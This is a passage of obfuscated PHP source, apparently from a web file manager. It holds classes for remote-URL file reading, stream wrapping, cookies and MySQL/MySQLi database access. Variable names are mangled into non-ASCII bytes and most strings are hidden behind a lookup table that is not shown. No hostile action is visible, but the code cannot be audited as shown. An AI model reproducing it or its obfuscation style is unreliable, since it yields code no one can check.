_isFolder($éŠÄ–Ú) { $Á„Ş›í =& $_SERVER[ÏÒ Ì„]; if ($éŠÄ–Ú == $Á„Ş›í[33] || $éŠÄ–Ú == $Á„Ş›í[8]) { return !0; } $¤çáªÂ = $this->_objectMeta($éŠÄ–Ú); return isset($¤çáªÂ[$Á„Ş›í[29]]) && $¤çáªÂ[$Á„Ş›í[29]] == $Á„Ş›í[77] ? !0 : !1; } } goto bÙŠÉƒÃÔ; bÙŠÉƒÃÔ: class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($ì­÷·Ø = false) { } public function exist($ğüÌÉ¬ù) { $ƒ»‹Ãùà = $this->info($ğüÌÉ¬ù); return $ƒ»‹Ãùà[$_SERVER[ÏÒ Ì„][195]]; } public function isFile($ÑÍÚ²Î­) { $Ëæı–Ì = $this->info($ÑÍÚ²Î­); return $Ëæı–Ì[$_SERVER[ÏÒ Ì„][195]]; } public function isFolder($§ƒÙÉøó) { return !1; } public function size($ªŸğÃ‹·) { $ÈùÓüÅ = $this->info($ªŸğÃ‹·); return $ÈùÓüÅ[$_SERVER[ÏÒ Ì„][78]]; } public function info($º‘áú ÷) { return $this->infoParse($º‘áú ÷); } public function infoAuth($Ö£±ù¶’) { return $this->infoParse($Ö£±ù¶’); } public function infoWithChildren($¼ÁÍ‰®’) { return $this->infoParse($¼ÁÍ‰®’); } public function infoFull($Ç†¿³÷¯) { return $this->infoParse($Ç†¿³÷¯); } private function infoParse($áìÂ£ŒÖ) { $âÜÆÏÃ€ =& $_SERVER[ÏÒ Ì„]; $÷Ãá× = $this->header($áìÂ£ŒÖ); if (!$÷Ãá× || !$÷Ãá×[$âÜÆÏÃ€[740]]) { return !1; } $Ü³™ì‡á = _get($÷Ãá×, $âÜÆÏÃ€[335], 0); $“° Å¿İ = array($âÜÆÏÃ€[28] => $÷Ãá×[$âÜÆÏÃ€[28]], $âÜÆÏÃ€[76] => $áìÂ£ŒÖ, $âÜÆÏÃ€[29] => $âÜÆÏÃ€[193], $âÜÆÏÃ€[78] => intval($Ü³™ì‡á), $âÜÆÏÃ€[168] => get_path_ext($÷Ãá×[$âÜÆÏÃ€[28]]), $âÜÆÏÃ€[1304] => $Ü³™ì‡á > 0 && $÷Ãá×[$âÜÆÏÃ€[1424]], $âÜÆÏÃ€[1305] => !1); return $“° Å¿İ; } private function header($ğı“¡è£) { $Š¦ÎÎ£¸ =& $_SERVER[ÏÒ Ì„]; if (isset(self::$_cacheHeader[$ğı“¡è£])) { return self::$_cacheHeader[$ğı“¡è£]; } $ÄíßÂÈ = isset($GLOBALS[$Š¦ÎÎ£¸[1425]]) ? $GLOBALS[$Š¦ÎÎ£¸[1425]] : !1; $GLOBALS[$Š¦ÎÎ£¸[1425]] = !0; self::$_cacheHeader[$ğı“¡è£] = url_header($ğı“¡è£); $GLOBALS[$Š¦ÎÎ£¸[1425]] = $ÄíßÂÈ; return self::$_cacheHeader[$ğı“¡è£]; } public function hashSimple($à¨­¥”œ, $ƒˆÔŸ«› = false) { $Š”Êûª· =& $_SERVER[ÏÒ Ì„]; $¥×Óˆ´ú = $this->info($à¨­¥”œ); if (!$¥×Óˆ´ú || !$¥×Óˆ´ú[$Š”Êûª·[195]]) { return !1; } $÷óöøÚ› = $¥×Óˆ´ú[$Š”Êûª·[78]]; $ú˜æÎê = 200; $ ïŞÌ‹ = 50; if ($÷óöøÚ› <= $ú˜æÎê * $ ïŞÌ‹) { return md5($this->fileSubstr($à¨­¥”œ, 0, $÷óöøÚ›)) . $÷óöøÚ›; } $•‰ê§•¶ = intval($÷óöøÚ› / $ ïŞÌ‹); $—€ì—â­ = $Š”Êûª·[33]; $ëûß‰ÌÚ = timeFloat(); $ÆºÎŒğĞ = 15; for ($É¼ı§ú = 0; $É¼ı§ú < $ ïŞÌ‹; $É¼ı§ú++) { if (timeFloat() - $ëûß‰ÌÚ > $ÆºÎŒğĞ) { return !1; } $Ìå²ß œ = $this->fileSubstr($à¨­¥”œ, $•‰ê§•¶ * $É¼ı§ú, $ú˜æÎê); if (!$Ìå²ß œ) { return !1; } $—€ì—â­ .= $Ìå²ß œ; } $—€ì—â­ .= $this->fileSubstr($à¨­¥”œ, $÷óöøÚ› - $ú˜æÎê, $ú˜æÎê); return md5($—€ì—â­) . $÷óöøÚ›; } public function getContent($´øĞ€œ) { return $this->fileSubstr($´øĞ€œ); } public function fileSubstr($¼ŸŠšµŠ, $½Å»µ¥ = 0, $¥¤á«ù³ = -1) { $‚˜–¨¤ç =& $_SERVER[ÏÒ Ì„]; $ÔæïÌï = $this->info($¼ŸŠšµŠ); if (!$ÔæïÌï || !$ÔæïÌï[$‚˜–¨¤ç[195]] && $ÔæïÌï[$‚˜–¨¤ç[78]] > 1024 * 1024 * 10) { return !1; } if ($¥¤á«ù³ === -1) { $¥¤á«ù³ = $ÔæïÌï[$‚˜–¨¤ç[78]]; } if ($¥¤á«ù³ == 0) { return $‚˜–¨¤ç[33]; } $Ïñá±¨² = array($‚˜–¨¤ç[1426] . $½Å»µ¥ . $‚˜–¨¤ç[774] . ($½Å»µ¥ + $¥¤á«ù³ - 1)); $®íë”¬ = url_request($¼ŸŠšµŠ, $‚˜–¨¤ç[228], !1, $Ïñá±¨², !1, !1, 1); return $®íë”¬[$‚˜–¨¤ç[1121]] ? $®íë”¬[$‚˜–¨¤ç[1121]] : $‚˜–¨¤ç[33]; } public function download($Äù”›“Ç, $”„ß±ï›) { Downloader::start($Äù”›“Ç, $”„ß±ï›); return $”„ß±ï›; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($Ş¿ÖÆº‡, $ÓİçšüÂ = '') { $this->info = $this->info($Ş¿ÖÆº‡); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[ÏÒ Ì„][76]]; $this->pathOpen = $Ş¿ÖÆº‡; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$Ş¿ÖÆº‡])) { self::$_chunkBuffer[$Ş¿ÖÆº‡] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($Æ†ÏìĞ½) { $¢€¸áğ´ = $this->fileSubstr($this->pose, $Æ†ÏìĞ½); $this->pose += strlen($¢€¸áğ´); return $¢€¸áğ´; } public function stream_tell() { return $this->pose; } public function stream_seek($„„ÌéÁ¶, $‘õ­¾¶¨) { $¾Ì¡øşÆ =& $_SERVER[ÏÒ Ì„]; if ($‘õ­¾¶¨ == SEEK_SET) { $this->pose = $„„ÌéÁ¶; } else { if ($‘õ­¾¶¨ == SEEK_CUR) { $this->pose += $„„ÌéÁ¶; } else { if ($‘õ­¾¶¨ == SEEK_END) { $this->pose = $this->info[$¾Ì¡øşÆ[78]] + intval($„„ÌéÁ¶); } } } if ($„„ÌéÁ¶ < 0) { $this->pose = $this->info[$¾Ì¡øşÆ[78]] + $„„ÌéÁ¶; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[ÏÒ Ì„][78]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($ìÕÉ³óÄ, $†Ã§ş†Â) { $ü¯÷èÄ =& $_SERVER[ÏÒ Ì„]; $ãî­¹• = $this->info($ìÕÉ³óÄ); return array($ü¯÷èÄ[1427] => 0, $ü¯÷èÄ[1428] => 0, $ü¯÷èÄ[12] => 32768 + 511, $ü¯÷èÄ[1429] => 0, $ü¯÷èÄ[1430] => 0, $ü¯÷èÄ[1431] => 0, $ü¯÷èÄ[1432] => 0, $ü¯÷èÄ[78] => $ãî­¹•[$ü¯÷èÄ[78]], $ü¯÷èÄ[1433] => $ãî­¹•[$ü¯÷èÄ[1303]], $ü¯÷èÄ[1389] => $ãî­¹•[$ü¯÷èÄ[84]], $ü¯÷èÄ[1388] => $ãî­¹•[$ü¯÷èÄ[194]], $ü¯÷èÄ[1434] => 0, $ü¯÷èÄ[1435] => 0); } static $fileInfo = array(); public function info($İŒœËÕ) { $¸÷ä±ã = $_SERVER[ÏÒ Ì„][1436]; if (isset(self::$fileInfo[$İŒœËÕ])) { return self::$fileInfo[$İŒœËÕ]; } if (substr($İŒœËÕ, 0, strlen($¸÷ä±ã)) != $¸÷ä±ã) { return !1; } self::$fileInfo[$İŒœËÕ] = IO::info(substr($İŒœËÕ, strlen($¸÷ä±ã))); return self::$fileInfo[$İŒœËÕ]; } public static function read($Ï‘æß±, $©’İ¼–´, $³¥ÖÖ’) { if (!isset(self::$_fopenCache[$Ï‘æß±])) { $â› ÷éÕ = new StreamWrapperIO(); $â› ÷éÕ->stream_open($Ï‘æß±); self::$_fopenCache[$Ï‘æß±] = $â› ÷éÕ; } $â› ÷éÕ = self::$_fopenCache[$Ï‘æß±]; return $â› ÷éÕ->fileSubstr($©’İ¼–´, $³¥ÖÖ’); } public static function _read($¦ŠÛï, $¬ÕŸŒÉ¬, $®œšÜí€) { $¤·Ç±Ü =& $_SERVER[ÏÒ Ì„]; $ÁİòØíè = fopen($¦ŠÛï, $¤·Ç±Ü[1307]); if (!$ÁİòØíè) { return $¤·Ç±Ü[33]; } $ÎŸ¢À™‚ = 8192; fseek($ÁİòØíè, $¬ÕŸŒÉ¬, SEEK_SET); $…ªôî¸ = $¤·Ç±Ü[33]; $È’±œª‘ = 0; while ($È’±œª‘ < $®œšÜí€) { $ª°üß¦Š = min($ÎŸ¢À™‚, $®œšÜí€ - $È’±œª‘); $…ªôî¸ .= fread($ÁİòØíè, $ª°üß¦Š); $È’±œª‘ += $ª°üß¦Š; } fclose($ÁİòØíè); return $…ªôî¸; } public function fileSubstr($”¡›Ò’ö, $„†Õ…“) { $É½…‡èÍ =& $_SERVER[ÏÒ Ì„]; $Àš®Ô¼Ó = $this->info[$É½…‡èÍ[78]]; $ê«´åƒ = $”¡›Ò’ö; $¢ğ½ôÚì = $„†Õ…“; if ($”¡›Ò’ö < 0) { $”¡›Ò’ö = $Àš®Ô¼Ó + $”¡›Ò’ö; } if ($„†Õ…“ === !1) { $„†Õ…“ = $Àš®Ô¼Ó - $”¡›Ò’ö; } if ($”¡›Ò’ö + $„†Õ…“ > $Àš®Ô¼Ó) { $„†Õ…“ = $Àš®Ô¼Ó - $”¡›Ò’ö; } if ($„†Õ…“ <= 0) { return $É½…‡èÍ[33]; } if ($”¡›Ò’ö < 0 || $”¡›Ò’ö >= $Àš®Ô¼Ó || $„†Õ…“ <= 0 || $„†Õ…“ > 1024 * 1024 * 10) { throw new Exception("\x69\x6f\x46\151\154\145\x52\x65\x61\144\x20\145\162\x72\157\x72\x21\x20\x73\164\x61\x72\x74\x3d{$”¡›Ò’ö}\73\154\x65\156\147\164\x68\x3d{$„†Õ…“}\73\x20\163\x69\172\145\75{$Àš®Ô¼Ó}\x3b"); } $çÂ¯­Ø = 64 * 1024; $Î³ƒÆ¹ =& self::$_chunkBuffer[$this->path]; if (!$Î³ƒÆ¹) { $Î³ƒÆ¹ = array(); } $¬ºÛí® = 0; $ÉÕÈŒ®Ÿ = 0; $üå¹§£ = $É½…‡èÍ[33]; foreach ($Î³ƒÆ¹ as $¬ºÛí® => $üå¹§£) { $¬ºÛí® = intval($¬ºÛí®); $ÉÕÈŒ®Ÿ = $¬ºÛí® + strlen($üå¹§£); if ($”¡›Ò’ö >= $ÉÕÈŒ®Ÿ) { continue; } if ($”¡›Ò’ö >= $¬ºÛí® && $”¡›Ò’ö + $„†Õ…“ <= $ÉÕÈŒ®Ÿ) { return substr($üå¹§£, $”¡›Ò’ö - $¬ºÛí®, $„†Õ…“); } break; } if (count($Î³ƒÆ¹) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($É½…‡èÍ[1437], $É½…‡èÍ[1438] . count($Î³ƒÆ¹) . "\x3b\x73\164\x61\162\164\75{$”¡›Ò’ö}\x2c\x6c\145\x6e\x67\164\x68\x3d{$„†Õ…“}\x3b\x70\157\163\145\x3a{$¬ºÛí®}\x7e{$ÉÕÈŒ®Ÿ}"); throw new Exception($É½…‡èÍ[1439]); } $úŠÎ€¾¨ = intval($”¡›Ò’ö / $çÂ¯­Ø) * $çÂ¯­Ø; $Û¬¥ş« = ceil(($”¡›Ò’ö + $„†Õ…“) / $çÂ¯­Ø) * $çÂ¯­Ø - $úŠÎ€¾¨; $Äù‚ÎŒú = IO::fileSubstr($this->path, $úŠÎ€¾¨, $Û¬¥ş«); $Î³ƒÆ¹[$úŠÎ€¾¨ . $É½…‡èÍ[33]] = $Äù‚ÎŒú; ksort($Î³ƒÆ¹); $ ­ö¬Œß = substr($Äù‚ÎŒú, $”¡›Ò’ö - $úŠÎ€¾¨, $„†Õ…“); return $ ­ö¬Œß; } private function log($ÆşÁÛ·, $à¤ ƒÁ) { $ß˜î¾‚ =& $_SERVER[ÏÒ Ì„]; $›ÈÔÁÒ = timeFloat() - $this->timeStart; write_log(sprintf($ß˜î¾‚[1440], $ÆşÁÛ·, $this->info[$ß˜î¾‚[28]], $›ÈÔÁÒ, $à¤ ƒÁ), $ß˜î¾‚[1111]); } } class Message { function __construct() { } public function send($Ø˜›’ş¨ = '', $‹éşüÜü = array(), $¼Ø¢ô“Â = "\x74\x65\170\164") { $Éô×¦ê¡ =& $_SERVER[ÏÒ Ì„]; $ÔØíğÛ = array($Éô×¦ê¡[29] => $Éô×¦ê¡[1441], $Éô×¦ê¡[745] => $Ø˜›’ş¨); if (in_array($¼Ø¢ô“Â, array($Éô×¦ê¡[1441], $Éô×¦ê¡[1442]))) { $ÔØíğÛ[$Éô×¦ê¡[29]] = $¼Ø¢ô“Â; } $‹éşüÜü = array($Éô×¦ê¡[509] => isset($‹éşüÜü[$Éô×¦ê¡[509]]) ? $‹éşüÜü[$Éô×¦ê¡[509]] : $Éô×¦ê¡[33], $Éô×¦ê¡[588] => isset($‹éşüÜü[$Éô×¦ê¡[588]]) ? $‹éşüÜü[$Éô×¦ê¡[588]] : $Éô×¦ê¡[33]); if (empty($Ø˜›’ş¨) || empty($‹éşüÜü[$Éô×¦ê¡[509]]) && empty($‹éşüÜü[$Éô×¦ê¡[588]])) { return !1; } $ÎÊÒÉÆ– = array($Éô×¦ê¡[1382] => $ÔØíğÛ, $Éô×¦ê¡[1443] => $‹éşüÜü); Hook::trigger($Éô×¦ê¡[1444], $ÎÊÒÉÆ–); } } goto dÖ‰°Ìá…; c´ê•Ñ°¹å: class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($ÒËú¹Å = '', $óĞÕŒ = 0) { if (is_string($ÒËú¹Å) && $ÒËú¹Å != $_SERVER[ÏÒ Ì„][33]) { $this->prefix = $ÒËú¹Å; } if (is_numeric($óĞÕŒ) && $óĞÕŒ > 0) { $this->expire = $óĞÕŒ; } } public static function getInstance() { static $Ç«‹ŠíŒ; if ($Ç«‹ŠíŒ === null) { $Ç«‹ŠíŒ = new self(); } return $Ç«‹ŠíŒ; } private static $cookieDisable = false; public static function disable($Øı³’ƒ’) { self::$cookieDisable = $Øı³’ƒ’; } private static $sameCookieSet = array(); public static function set($İÙıçü, $ôÅŞ…ö¾, $İîé¡ù• = 0, $ËÏ„Ä•¯ = false, $¸×·Ñî£ = false) { $Á€áÔäÔ =& $_SERVER[ÏÒ Ì„]; if (self::$cookieDisable) { return; } if (!$İîé¡ù•) { $İîé¡ù• = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$İÙıçü]) && self::$sameCookieSet[$İÙıçü] == $ôÅŞ…ö¾ . $İîé¡ù•) { return; } self::$sameCookieSet[$İÙıçü] = $ôÅŞ…ö¾ . $İîé¡ù•; if (!$¸×·Ñî£) { $¸×·Ñî£ = str_replace(HOST, $Á€áÔäÔ[33], APP_HOST); $¸×·Ñî£ = _get($GLOBALS, $Á€áÔäÔ[881], $¸×·Ñî£); } $‚¯…ŠÑø = $Á€áÔäÔ[33]; setcookie($İÙıçü, $ôÅŞ…ö¾, time() + $İîé¡ù•, $Á€áÔäÔ[8] . trim($¸×·Ñî£, $Á€áÔäÔ[8]) . $‚¯…ŠÑø, !1, !1, $ËÏ„Ä•¯); } public static function setSafe($Û’—ºíÄ, $„Î„Ş®², $Š–äáÄÌ = 0) { self::set($Û’—ºíÄ, $„Î„Ş®², $Š–äáÄÌ, !0); } public static function get($‹¹”İŸØ) { return isset($_COOKIE[$‹¹”İŸØ]) ? $_COOKIE[$‹¹”İŸØ] : !1; } public static function remove($°¡¨ÜÜ, $‘ÖÄ£’ = false) { unset($_COOKIE[$°¡¨ÜÜ]); self::set($°¡¨ÜÜ, $_SERVER[ÏÒ Ì„][33], 1, $‘ÖÄ£’); } } class DbMysql extends Db { public function __construct($¹½´¨ŒÊ = '') { $ğ¯îüâú =& $_SERVER[ÏÒ Ì„]; if (!extension_loaded($ğ¯îüâú[791])) { think_exception(think_lang($ğ¯îüâú[10]) . $ğ¯îüâú[882]); } if (!empty($¹½´¨ŒÊ)) { $this->config = $¹½´¨ŒÊ; if (empty($this->config[$ğ¯îüâú[13]])) { $this->config[$ğ¯îüâú[13]] = $ğ¯îüâú[33]; } } } public function connect($ÆºÌËì’ = '', $ô›”ƒÒÔ = 0, $âáêé»ö = false) { $äÈ‚äß² =& $_SERVER[ÏÒ Ì„]; if (!isset($this->linkID[$ô›”ƒÒÔ])) { if (empty($ÆºÌËì’)) { $ÆºÌËì’ = $this->config; } $®®©ˆò÷ = $ÆºÌËì’[$äÈ‚äß²[883]] . ($ÆºÌËì’[$äÈ‚äß²[884]] ? "\72{$ÆºÌËì’[$äÈ‚äß²[884]]}" : $äÈ‚äß²[33]); $èİÕã¹İ = !empty($ÆºÌËì’[$äÈ‚äß²[13]][$äÈ‚äß²[14]]) ? $ÆºÌËì’[$äÈ‚äß²[13]][$äÈ‚äß²[14]] : $this->pconnect; if ($èİÕã¹İ) { $this->linkID[$ô›”ƒÒÔ] = mysql_pconnect($®®©ˆò÷, $ÆºÌËì’[$äÈ‚äß²[885]], $ÆºÌËì’[$äÈ‚äß²[886]], 131072); } else { $this->linkID[$ô›”ƒÒÔ] = mysql_connect($®®©ˆò÷, $ÆºÌËì’[$äÈ‚äß²[885]], $ÆºÌËì’[$äÈ‚äß²[886]], !0, 131072); } if (!$this->linkID[$ô›”ƒÒÔ] || !empty($ÆºÌËì’[$äÈ‚äß²[17]]) && !mysql_select_db($ÆºÌËì’[$äÈ‚äß²[17]], $this->linkID[$ô›”ƒÒÔ])) { think_exception(mysql_error()); } $ŒÓáÕ…î = mysql_get_server_info($this->linkID[$ô›”ƒÒÔ]); mysql_query($äÈ‚äß²[887] . think_config($äÈ‚äß²[888]) . $äÈ‚äß²[55], $this->linkID[$ô›”ƒÒÔ]); if ($ŒÓáÕ…î > $äÈ‚äß²[889]) { mysql_query($äÈ‚äß²[890], $this->linkID[$ô›”ƒÒÔ]); } $this->connected = !0; if (1 != think_config($äÈ‚äß²[18])) { unset($this->config); } } return $this->linkID[$ô›”ƒÒÔ]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($ßŠïÀ¥¿) { $„»Ñ³¹À =& $_SERVER[ÏÒ Ì„]; if (0 === stripos($ßŠïÀ¥¿, $„»Ñ³¹À[262])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ßŠïÀ¥¿; if ($this->queryID) { $this->free(); } think_action_status($„»Ñ³¹À[19], 1); think_status($„»Ñ³¹À[20]); $this->queryID = mysql_query($ßŠïÀ¥¿, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($ƒóâ”¼ş) { $£Şˆ„’´ =& $_SERVER[ÏÒ Ì„]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ƒóâ”¼ş; if ($this->queryID) { $this->free(); } think_action_status($£Şˆ„’´[21], 1); think_status($£Şˆ„’´[20]); $ÀÉßç·‰ = mysql_query($ƒóâ”¼ş, $this->_linkID); $this->debug(); if (!1 === $ÀÉßç·‰) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[ÏÒ Ì„][891], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $¦˜Ä¯Î¡ = mysql_query($_SERVER[ÏÒ Ì„][892], $this->_linkID); $this->transTimes = 0; if (!$¦˜Ä¯Î¡) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $È®×µïò = mysql_query($_SERVER[ÏÒ Ì„][893], $this->_linkID); $this->transTimes = 0; if (!$È®×µïò) { $this->error(); return !1; } } return !0; } private function getAll() { $ÄÏ¹ÊÜ = array(); if ($this->numRows > 0) { while ($€‡Õ£Áë = mysql_fetch_assoc($this->queryID)) { $ÄÏ¹ÊÜ[] = $€‡Õ£Áë; } mysql_data_seek($this->queryID, 0); } return $ÄÏ¹ÊÜ; } public function getFields($«¥ß«Ëã) { $´¶ÀÉç =& $_SERVER[ÏÒ Ì„]; $³ê Úö = $this->query($´¶ÀÉç[894] . $this->parseKey($«¥ß«Ëã)); $¢ÊºÎ˜Æ = array(); if ($³ê Úö) { foreach ($³ê Úö as $»Œ½çÓÀ => $à®Ëøäà) { $¢ÊºÎ˜Æ[$à®Ëøäà[$´¶ÀÉç[27]]] = array($´¶ÀÉç[28] => $à®Ëøäà[$´¶ÀÉç[27]], $´¶ÀÉç[29] => $à®Ëøäà[$´¶ÀÉç[30]], $´¶ÀÉç[31] => (bool) (strtoupper($à®Ëøäà[$´¶ÀÉç[32]]) === $´¶ÀÉç[895]), $´¶ÀÉç[34] => $à®Ëøäà[$´¶ÀÉç[35]], $´¶ÀÉç[36] => strtolower($à®Ëøäà[$´¶ÀÉç[37]]) == $´¶ÀÉç[38], $´¶ÀÉç[39] => strtolower($à®Ëøäà[$´¶ÀÉç[40]]) == $´¶ÀÉç[41]); } } return $¢ÊºÎ˜Æ; } public function getTables($Üû¢¹Š = '') { $ï©ÆÓß‚ =& $_SERVER[ÏÒ Ì„]; if (!empty($Üû¢¹Š)) { $ÖØÍÂŒ© = $ï©ÆÓß‚[896] . $Üû¢¹Š . $ï©ÆÓß‚[897]; } else { $ÖØÍÂŒ© = $ï©ÆÓß‚[898]; } $ËÏî˜£Ü = $this->query($ÖØÍÂŒ©); $¥ØÆòĞŸ = array(); foreach ($ËÏî˜£Ü as $¤Ä‹½òÎ => $ƒ„šùøÜ) { $¥ØÆòĞŸ[$¤Ä‹½òÎ] = current($ƒ„šùøÜ); } return $¥ØÆòĞŸ; } public function replace($ÒÎ²ÙßÄ, $Í Ÿ×¦ = array()) { $·èùÌÖç =& $_SERVER[ÏÒ Ì„]; foreach ($ÒÎ²ÙßÄ as $Ì‰ëÉÆ => $´À½úß¥) { $€Ø³øšŞ = $this->parseValue($´À½úß¥); if (is_scalar($€Ø³øšŞ)) { $ñı€›·¤[] = $€Ø³øšŞ; $’†ø´È[] = $this->parseKey($Ì‰ëÉÆ); } } $¢óÊŸëÀ = $·èùÌÖç[899] . $this->parseTable($Í Ÿ×¦[$·èùÌÖç[277]]) . $·èùÌÖç[900] . implode($·èùÌÖç[47], $’†ø´È) . $·èùÌÖç[901] . implode($·èùÌÖç[47], $ñı€›·¤) . $·èùÌÖç[902]; return $this->execute($¢óÊŸëÀ); } public function insertAll($Î­Ë¦Ñ­, $£Õ¢–š = array(), $´ç¶Ÿıé = false) { $Ó²ÑúÅ =& $_SERVER[ÏÒ Ì„]; if (!is_array($Î­Ë¦Ñ­[0])) { return !1; } $¿‡Š°× = array_keys($Î­Ë¦Ñ­[0]); $˜üË™Ã = array(); foreach ($Î­Ë¦Ñ­ as $¢¤„ Ç) { $æê¬©±± = array(); foreach ($¢¤„ Ç as $ €Ê­º  => $ö…ˆ•šá) { $ö…ˆ•šá = $this->parseValue($ö…ˆ•šá); if (is_scalar($ö…ˆ•šá)) { $æê¬©±±[] = $ö…ˆ•šá; } } $˜üË™Ã[] = $Ó²ÑúÅ[258] . implode($Ó²ÑúÅ[47], $æê¬©±±) . $Ó²ÑúÅ[902]; } array_walk($¿‡Š°×, array($this, $Ó²ÑúÅ[903])); $–¾¼­ƒö = ($´ç¶Ÿıé ? $Ó²ÑúÅ[904] : $Ó²ÑúÅ[905]) . $Ó²ÑúÅ[906] . $this->parseTable($£Õ¢–š[$Ó²ÑúÅ[277]]) . $Ó²ÑúÅ[900] . implode($Ó²ÑúÅ[47], $¿‡Š°×) . $Ó²ÑúÅ[907] . implode($Ó²ÑúÅ[47], $˜üË™Ã); return $this->execute($–¾¼­ƒö); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $ßó“’§Ï =& $_SERVER[ÏÒ Ì„]; $this->error = mysql_errno() . $ßó“’§Ï[4] . mysql_error($this->_linkID); if ($ßó“’§Ï[33] != $this->queryStr) { $this->error .= LNG($ßó“’§Ï[45]) . $this->queryStr; } think_trace($this->error, $ßó“’§Ï[33], $ßó“’§Ï[46]); return $this->error; } public function escapeString($îÂ˜­şË) { if ($this->_linkID) { return mysql_real_escape_string($îÂ˜­şË, $this->_linkID); } else { return mysql_escape_string($îÂ˜­şË); } } public function parseKey(&$‹Ğ¢¶¦³, $«¦ÄÃÖõ = true) { $¼öõ‘¯ =& $_SERVER[ÏÒ Ì„]; if ($«¦ÄÃÖõ) { $‹Ğ¢¶¦³ = $this->parseKeyCheck($‹Ğ¢¶¦³); } if ($‹Ğ¢¶¦³ != $¼öõ‘¯[182] && !preg_match($¼öõ‘¯[908], $‹Ğ¢¶¦³)) { $‹Ğ¢¶¦³ = $¼öõ‘¯[383] . trim($‹Ğ¢¶¦³, $¼öõ‘¯[383]) . $¼öõ‘¯[383]; } return $‹Ğ¢¶¦³; } } class DbMysqli extends Db { public function __construct($®Ö÷‹Êö = '') { $©±çæÉõ =& $_SERVER[ÏÒ Ì„]; if (!extension_loaded($©±çæÉõ[790])) { think_exception(think_lang($©±çæÉõ[10]) . $©±çæÉõ[909]); } if (!empty($®Ö÷‹Êö)) { $this->config = $®Ö÷‹Êö; if (empty($this->config[$©±çæÉõ[13]])) { $this->config[$©±çæÉõ[13]] = $©±çæÉõ[33]; } } } public function connect($¡ÇˆÓöŠ = '', $ñù¯ñˆõ = 0) { $ïªºò¦Õ =& $_SERVER[ÏÒ Ì„]; if (!isset($this->linkID[$ñù¯ñˆõ])) { if (empty($¡ÇˆÓöŠ)) { $¡ÇˆÓöŠ = $this->config; } $this->linkID[$ñù¯ñˆõ] = new mysqli($¡ÇˆÓöŠ[$ïªºò¦Õ[883]], $¡ÇˆÓöŠ[$ïªºò¦Õ[885]], $¡ÇˆÓöŠ[$ïªºò¦Õ[886]], $¡ÇˆÓöŠ[$ïªºò¦Õ[17]], $¡ÇˆÓöŠ[$ïªºò¦Õ[884]] ? intval($¡ÇˆÓöŠ[$ïªºò¦Õ[884]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $‘‰£˜Ä² = $this->linkID[$ñù¯ñˆõ]->server_version; $this->linkID[$ñù¯ñˆõ]->query($ïªºò¦Õ[887] . think_config($ïªºò¦Õ[888]) . $ïªºò¦Õ[55]); if ($‘‰£˜Ä² > $ïªºò¦Õ[889]) { $this->linkID[$ñù¯ñˆõ]->query($ïªºò¦Õ[890]); } $this->connected = !0; if (1 != think_config($ïªºò¦Õ[18])) { unset($this->config); } } return $this->linkID[$ñù¯ñˆõ]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($¿äíÔûí) { $¹ÇßÇ«‘ =& $_SERVER[ÏÒ Ì„]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $¿äíÔûí; if ($this->queryID) { $this->free(); } think_action_status($¹ÇßÇ«‘[19], 1); think_status($¹ÇßÇ«‘[20]); $this->queryID = $this->_linkID->query($¿äíÔûí); if ($this->_linkID->more_results()) { while (($öÖ–Òñá = $this->_linkID->next_result()) != NULL) { $öÖ–Òñá->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($Àãûå­ò) { $ öú”¬æ =& $_SERVER[ÏÒ Ì„]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Àãûå­ò; if ($this->queryID) { $this->free(); } think_action_status($ öú”¬æ[21], 1); think_status($ öú”¬æ[20]); $ú”­æ§ = $this->_linkID->query($Àãûå­ò); $this->debug(); if (!1 === $ú”­æ§) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $õğš…ÔÃ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$õğš…ÔÃ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $³£ŒŸåß = $this->_linkID->rollback(); $this->transTimes = 0; if (!$³£ŒŸåß) { $this->error(); return !1; } } return !0; } private function getAll() { $š–ñÃº = array(); if ($this->numRows > 0) { for ($Ú …Š´” = 0; $Ú …Š´” < $this->numRows; $Ú …Š´”++) { $š–ñÃº[$Ú …Š´”] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $š–ñÃº; } public function 